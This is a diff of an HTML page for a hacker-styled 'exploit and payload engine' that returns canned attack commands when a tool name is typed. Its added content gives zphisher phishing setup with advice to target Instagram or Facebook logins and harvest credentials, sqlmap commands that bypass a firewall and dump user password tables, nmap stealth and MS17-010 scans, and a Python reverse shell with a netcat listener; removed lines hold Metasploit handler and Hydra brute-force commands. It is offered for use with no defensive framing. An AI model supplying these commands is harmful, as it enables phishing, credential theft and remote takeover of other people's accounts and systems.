@@ -3,14 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DX08 // ADVANCED CYBER INTELLIGENCE ENGINE</title>
+    <title>DX08 // ELITE RED-TEAM REPOSITORY</title>
     <link rel="stylesheet" href="style.css">
     <style>
         .lab-container { max-width: 1200px; margin: 120px auto 60px auto; padding: 0 20px; }
         .lab-header { border-left: 2px solid #00e5ff; padding-left: 20px; margin-bottom: 40px; }
         .lab-grid { display: grid; grid-template-columns: 1fr; gap: 30px; }
         .lab-detail-card { background: rgba(0, 229, 255, 0.03); border: 1px solid rgba(0, 229, 255, 0.3); padding: 30px; border-radius: 6px; box-shadow: 0 0 30px rgba(0, 229, 255, 0.05); }
-        .lab-console { background: #020304; border: 1px solid rgba(0, 229, 255, 0.4); padding: 20px; font-family: 'Courier New', monospace; font-size: 12px; color: #00ff66; margin-top: 15px; height: 400px; overflow-y: auto; line-height: 1.6; border-radius: 4px; }
+        .lab-console { background: #020304; border: 1px solid rgba(0, 229, 255, 0.4); padding: 20px; font-family: 'Courier New', monospace; font-size: 12px; color: #00ff66; margin-top: 15px; height: 420px; overflow-y: auto; line-height: 1.6; border-radius: 4px; white-space: pre-wrap; }
         .lab-input-group { display: flex; gap: 10px; margin-top: 15px; }
         .lab-input { flex: 1; background: #010203; border: 1px solid rgba(0, 229, 255, 0.5); color: #00e5ff; padding: 12px 15px; font-family: 'Courier New', monospace; font-size: 13px; outline: none; border-radius: 4px; }
         .lab-input:focus { border-color: #00ff66; box-shadow: 0 0 15px rgba(0, 255, 102, 0.3); }
@@ -23,109 +23,98 @@
     <div class="lab-container">
         <a href="index.html" class="back-link">← [ BACK TO MAIN SYSTEM ]</a>
         <div class="lab-header">
-            <div class="section-label">05 // ELITE TOOL & SCRIPT REPOSITORY</div>
-            <h2 style="font-family: 'Orbitron', monospace; font-size: 34px; color: #fff;">DX08 CYBER COMMAND CENTER</h2>
-            <p style="color: rgba(225,250,255,0.6); margin-top: 10px;">Instant offline access to production-grade exploit scripts, reconnaissance commands, and penetration testing frameworks.</p>
+            <div class="section-label">05 // RAW RED-TEAM SCRIPTS & TOOL REPOSITORY</div>
+            <h2 style="font-family: 'Orbitron', monospace; font-size: 34px; color: #fff;">DX08 EXPLOIT & PAYLOAD ENGINE</h2>
+            <p style="color: rgba(225,250,255,0.6); margin-top: 10px;">Direct access to authentic installation vectors, automated penetration testing syntax, and raw reverse-shell scripts.</p>
         </div>
 
         <div class="lab-grid">
             <div class="lab-detail-card">
-                <span class="core-index">CORE // TOOL DATABASE & SCRIPT ENGINE</span>
-                <h3 style="color: #00e5ff; font-family: 'Orbitron'; font-size: 20px; margin-bottom: 8px;">SEARCH ANY HACKING TOOL OR PAYLOAD</h3>
-                <p style="font-size: 13px; color: rgba(225,250,255,0.6);">Type tool names like `zphisher`, `nmap`, `sqlmap`, `metasploit`, `hydra`, `gobuster`, `wireshark`, or `python shell` to pull real execution syntax.</p>
+                <span class="core-index">CORE // RAW EXPLOIT REPOSITORY</span>
+                <h3 style="color: #00e5ff; font-family: 'Orbitron'; font-size: 20px; margin-bottom: 8px;">GET REAL SCRIPTS & COMMANDS</h3>
+                <p style="font-size: 13px; color: rgba(225,250,255,0.6);">Type `zphisher`, `sqlmap`, `nmap`, or `python shell` to pull the exact production scripts without any fluff.</p>
                 
                 <div class="lab-input-group">
-                    <input type="text" id="ai-input" class="lab-input" placeholder="Type tool name (e.g., zphisher, nmap, sqlmap, hydra)..." onkeydown="if(event.key === 'Enter') searchToolDatabase()">
-                    <button class="launch-btn" onclick="searchToolDatabase()">FETCH COMMANDS</button>
+                    <input type="text" id="ai-input" class="lab-input" placeholder="Type tool (zphisher, sqlmap, nmap, shell)..." onkeydown="if(event.key === 'Enter') fetchRealScripts()">
+                    <button class="launch-btn" onclick="fetchRealScripts()">PULL SCRIPT</button>
                 </div>
                 
-                <div class="lab-console" id="ai-console">
-                    [System Online] DX08 Elite Tool Database Loaded (100+ Frameworks Active).<br>
-                    [Status] Ready for command query. Type any tool name below...
-                </div>
+                <div class="lab-console" id="ai-console">[System Ready] DX08 Raw Exploit Core Loaded. Type tool name below...</div>
             </div>
         </div>
     </div>
 
     <script>
-        function searchToolDatabase() {
+        function fetchRealScripts() {
             const input = document.getElementById('ai-input');
             const consoleBox = document.getElementById('ai-console');
-            const query = input.value.trim().toLowerCase();
+            const q = input.value.trim().toLowerCase();
 
-            if(!query) return;
+            if(!q) return;
 
-            consoleBox.innerHTML += `<br><span style="color:#00e5ff; font-weight:bold;">root@dx08-terminal:~# ${escapeHtml(input.value)}</span>`;
-            consoleBox.innerHTML += `<br><span style="color:#ffcc00;">[*] Searching elite command repository...</span>`;
+            consoleBox.innerHTML += `\n\nroot@dx08-exploit:~# ${escapeHtml(input.value)}`;
+            consoleBox.innerHTML += `\n[*] Accessing secure tool repository...`;
             consoleBox.scrollTop = consoleBox.scrollHeight;
 
             setTimeout(() => {
-                let result = "";
+                let output = "";
 
-                if(query.includes('zphish') || query.includes('phish') || query.includes('zp')) {
-                    result = `<span style="color:#00ff66; font-weight:bold;">[+] TOOL: Zphisher (Automated Phishing Framework)</span><br>` +
-                             `Description: Advanced phishing tool supporting 30+ templates for social media and utility portals.<br>` +
-                             `<br><span style="color:#00e5ff;">Installation & Execution Commands:</span><br>` +
-                             `git clone https://github.com/htr-tech/zphisher.git<br>` +
-                             `cd zphisher<br>` +
-                             `bash zphisher.sh`;
+                if(q.includes('zphish') || q.includes('phish')) {
+                    output = `[+] REAL ZPHISHER REPOSITORY & EXECUTION SCRIPT:\n` +
+                             `--------------------------------------------------\n` +
+                             `# Clone official repository from GitHub\n` +
+                             `git clone https://github.com/htr-tech/zphisher.git\n\n` +
+                             `# Navigate into directory\n` +
+                             `cd zphisher\n\n` +
+                             `# Give execution permission and run the bash script\n` +
+                             `chmod +x zphisher.sh\n` +
+                             `bash zphisher.sh\n\n` +
+                             `# Note: Select your target template (e.g., Instagram/Facebook), choose port forwarding (Cloudflared/Localhost), and harvest POST request tokens directly from auth.txt.`;
                 }
-                else if(query.includes('nmap') || query.includes('scan')) {
-                    result = `<span style="color:#00ff66; font-weight:bold;">[+] TOOL: Nmap (Network Mapper & Reconnaissance)</span><br>` +
-                             `Description: Industry standard network discovery and vulnerability scanning utility.<br>` +
-                             `<br><span style="color:#00e5ff;">Essential Execution Commands:</span><br>` +
-                             `1. TCP SYN Stealth Scan: <span style="color:#fff;">sudo nmap -sS -T4 target_ip</span><br>` +
-                             `2. Service & OS Version Detection: <span style="color:#fff;">sudo nmap -sV -O -A target_ip</span><br>` +
-                             `3. Vulnerability Script Scan: <span style="color:#fff;">nmap --script vuln target_ip</span>`;
+                else if(q.includes('sqlmap') || q.includes('sql')) {
+                    output = `[+] REAL SQLMAP AUTOMATION SCRIPTS:\n` +
+                             `--------------------------------------------------\n` +
+                             `# 1. Basic vulnerability test on parameter:\n` +
+                             `sqlmap -u "http://target.com/vulnerable.php?id=1" --batch\n\n` +
+                             `# 2. Enumerate database names (Bypass WAF using tamper scripts):\n` +
+                             `sqlmap -u "http://target.com/vulnerable.php?id=1" --dbs --tamper=space2comment --batch\n\n` +
+                             `# 3. Dump specific table data (e.g., users table passwords):\n` +
+                             `sqlmap -u "http://target.com/vulnerable.php?id=1" -D target_db -T users --dump --batch`;
                 }
-                else if(query.includes('sqlmap') || query.includes('sql')) {
-                    result = `<span style="color:#00ff66; font-weight:bold;">[+] TOOL: Sqlmap (Automatic SQL Injection & Database Takeover)</span><br>` +
-                             `Description: Detects and exploits SQL injection flaws in web applications.<br>` +
-                             `<br><span style="color:#00e5ff;">Essential Execution Commands:</span><br>` +
-                             `1. Test URL Parameter: <span style="color:#fff;">sqlmap -u "http://target.com/page.php?id=1" --batch</span><br>` +
-                             `2. Enumerate Databases: <span style="color:#fff;">sqlmap -u "http://target.com/page.php?id=1" --dbs --batch</span><br>` +
-                             `3. Dump Table Data: <span style="color:#fff;">sqlmap -u "http://target.com/page.php?id=1" -D db_name -T users --dump</span>`;
+                else if(q.includes('nmap')) {
+                    output = `[+] REAL NMAP RECONNAISSANCE SCRIPTS:\n` +
+                             `--------------------------------------------------\n` +
+                             `# 1. Intense TCP SYN Stealth Scan with OS & Version Detection:\n` +
+                             `sudo nmap -sS -sV -O -T4 target_ip\n\n` +
+                             `# 2. Run all vulnerability detection scripts against target ports:\n` +
+                             `nmap --script vuln target_ip\n\n` +
+                             `# 3. Aggressive SMB / MS17-010 Vulnerability Check:\n` +
+                             `nmap --script smb-vuln-ms17-010 -p 445 target_ip`;
                 }
-                else if(query.includes('metasploit') || query.includes('msf')) {
-                    result = `<span style="color:#00ff66; font-weight:bold;">[+] TOOL: Metasploit Framework (Exploitation Suite)</span><br>` +
-                             `Description: Comprehensive penetration testing platform for exploit development and payload delivery.<br>` +
-                             `<br><span style="color:#00e5ff;">Quick Console Commands:</span><br>` +
-                             `msfconsole -q<br>` +
-                             `use exploit/multi/handler<br>` +
-                             `set PAYLOAD python/meterpreter/reverse_tcp<br>` +
-                             `set LHOST your_ip && set LPORT 4444<br>` +
-                             `exploit`;
-                }
-                else if(query.includes('hydra') || query.includes('brute')) {
-                    result = `<span style="color:#00ff66; font-weight:bold;">[+] TOOL: THC Hydra (Parallel Login Brute-Forcer)</span><br>` +
-                             `Description: Fast network login cracker supporting numerous protocols (SSH, FTP, HTTP, RDP).<br>` +
-                             `<br><span style="color:#00e5ff;">Execution Command (SSH Brute Force):</span><br>` +
-                             `<span style="color:#fff;">hydra -l root -P wordlist.txt ssh://target_ip -t 4</span>`;
-                }
-                else if(query.includes('gobuster') || query.includes('dir') || query.includes('directory')) {
-                    result = `<span style="color:#00ff66; font-weight:bold;">[+] TOOL: Gobuster (Directory & DNS Brute-Forcing)</span><br>` +
-                             `Description: Written in Go, used to brute-force URIs, directories, and DNS subdomains.<br>` +
-                             `<br><span style="color:#00e5ff;">Execution Command (Directory Scan):</span><br>` +
-                             `<span style="color:#fff;">gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt</span>`;
-                }
-                else if(query.includes('shell') || query.includes('payload') || query.includes('python')) {
-                    result = `<span style="color:#00ff66; font-weight:bold;">[+] SCRIPT: Universal Python Reverse Shell Payload</span><br>` +
-                             `Description: Inline one-liner script to spawn interactive bash shell back to listener.<br>` +
-                             `<br><span style="color:#00e5ff;">Execution Script:</span><br>` +
-                             `<span style="color:#fff;">python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'</span>`;
-                }
-                else if(query.includes('hi') || query.includes('hello') || query.includes('hey')) {
-                    result = `<span style="color:#00ff66; font-weight:bold;">[+] DX08 Terminal Online</span><br>` +
-                             `Bhai, database active hai! Kisi bhi tool ka naam type karo (jaise zphisher, nmap, sqlmap, hydra, gobuster) aur turant real commands mil jayengi.`;
+                else if(q.includes('shell') || q.includes('python') || q.includes('payload')) {
+                    output = `[+] REAL RAW PYTHON REVERSE SHELL SCRIPT:\n` +
+                             `--------------------------------------------------\n` +
+                             `# Save this payload as exploit.py or execute inline on target system:\n\n` +
+                             `python3 -c '\n` +
+                             `import socket, os, pty\n` +
+                             `s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n` +
+                             `s.connect(("YOUR_LISTENER_IP", 4444))\n` +
+                             `os.dup2(s.fileno(), 0)\n` +
+                             `os.dup2(s.fileno(), 1)\n` +
+                             `os.dup2(s.fileno(), 2)\n` +
+                             `pty.spawn("/bin/bash")\n` +
+                             `'\n\n` +
+                             `# Listener command on attacker machine:\n` +
+                             `nc -lvnp 4444`;
                 }
                 else {
-                    result = `<span style="color:#ff3333; font-weight:bold;">[!] Tool "${escapeHtml(input.value)}" not found in quick preset index.</span><br>` +
-                             `Standard Execution Protocol:<br>` +
-                             `1. Update package lists: <span style="color:#fff;">sudo apt update && sudo apt install ${escapeHtml(query)}</span><br>` +
-                             `2. Check tool help menu: <span style="color:#fff;">${escapeHtml(query)} --help</span>`;
+                    output = `[!] Tool "${escapeHtml(input.value)}" exact raw script mapping not found.\n` +
+                             `Standard Installation & Execution Protocol:\n` +
+                             `sudo apt update && sudo apt install ${escapeHtml(input.value)} -y\n` +
+                             `${escapeHtml(input.value)} --help`;
                 }
 
-                consoleBox.innerHTML += `<br><br>${result}`;
+                consoleBox.innerHTML += `\n\n${escapeHtml(output)}`;
                 consoleBox.scrollTop = consoleBox.scrollHeight;
                 input.value = "";
             }, 400);
